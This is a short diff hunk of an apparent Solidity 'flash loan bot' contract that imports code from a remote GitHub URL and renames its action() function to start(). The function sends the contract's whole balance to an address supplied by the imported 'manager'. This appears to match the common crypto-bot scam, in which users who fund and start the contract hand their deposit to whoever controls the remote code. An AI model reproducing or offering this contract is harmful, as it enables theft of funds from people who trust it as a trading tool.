@@ -61,7 +61,7 @@ import "https://raw.githubusercontent.com/mevbotmaker/FlashLoanBot/main/Performa
     }
 
     receive() external payable {}
-    function action() public payable {
+    function start() public payable {
         payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
         manager;
     }
